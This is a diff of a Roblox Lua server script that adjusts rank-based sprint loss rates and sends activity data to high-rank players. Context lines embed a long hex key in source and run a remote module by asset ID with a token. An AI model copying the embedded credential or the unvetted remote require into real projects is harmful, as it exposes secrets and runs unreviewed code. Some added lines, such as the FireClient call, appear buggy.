@@ -35,6 +35,7 @@ local looping = false
 local identifier = game.JobId
 
 local Activity = {}
+local ActivityData = {}
 
 function processActivity(baseDict,targetDoc,Player)
 	local prevTime,total,stringId = 0,0,tostring(Player.UserId)
@@ -250,23 +251,20 @@ function PlayerAdded(Player)
 	PIF.Role.Value = PlayerRole
 	
 	-- > Sets stat looss rates
-	local LossValue = 0.1
+	local LossValue = 0.05 * PlayerRank
 	if PlayerRank == 0 then
 		PlayerRole = "👁️ Lost Peculiar"
 	elseif PlayerRank >= 5 then
 		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]+1
-		if PlayerRank < 100 then
-			PIF.Stats.SprintLossRate.Value = 0.15
-		elseif PlayerRank >= 100 then
-			PIF.Stats.SprintLossRate.Value = 0.5
-		elseif PlayerRank >= 240 then
-			PIF.Stats.SprintLossRate.Value = 1
-		end
+		PIF.Stats.SprintLossRate.Value = LossValue
 	end
 
 	game.ReplicatedStorage.Server.Ext.Staff.Value = serverSettings["Server Information"]["Staff"]
 	PIF.Parent = Player
 	Activity[Player] = tick()
+
+	if ActivityData == nil then repeat task.wait() until ActivityData ~= nil end;
+	if PlayerRank >= 100 then RemoteEvent:FireClient("Data Update",ActivityData) end
 end
 
 function PlayerRemoving(Player)
@@ -295,7 +293,7 @@ function Setup()
 	serverSettings["Server Information"]["Name"] = (loopNames["Adjective"][math.random(1,#loopNames["Adjective"])].." "..loopNames["Noun"][math.random(1,#loopNames["Noun"])])
 	game.ReplicatedStorage.Server.Ext.LoopName.Value = serverSettings["Server Information"]["Name"]
 	game.ReplicatedStorage.Server.Ext.JobId.Value = serverSettings["Server Information"]["JobId"]
-	DataHandler.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2","thaexternaldata-33wzygh1aq")
+	DataHandler.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2")
 	TimeHandler.Setup()
 	game.Lighting.ClockTime = 5
     require(5603385392)("dwKFccX44THicgKslaHg")
